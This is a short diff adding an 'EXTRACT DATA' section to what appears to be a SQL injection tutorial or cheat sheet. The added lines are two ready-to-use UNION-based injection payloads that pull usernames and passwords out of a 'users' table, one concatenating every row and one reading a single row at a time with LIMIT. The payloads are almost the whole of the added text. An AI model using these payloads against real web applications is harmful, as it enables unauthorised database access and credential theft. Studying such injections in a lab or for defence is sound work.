@@ -42,4 +42,8 @@ OUTPUT:    |id|,|username|,|password|,|user_type|,|sec_code|
 
 #### EXTRACT DATA
 
+`1' union Select all 1,group_concat(0x7c,username,0x3a,password,0x7c),3 from users%23`
 
+OR you can add limit using the `limit 0,1`, `limit 1,1`, `limit 2,1`...
+
+`1' union Select 1,concat(username,0x3a,password),3 from users limit 2,1%23`
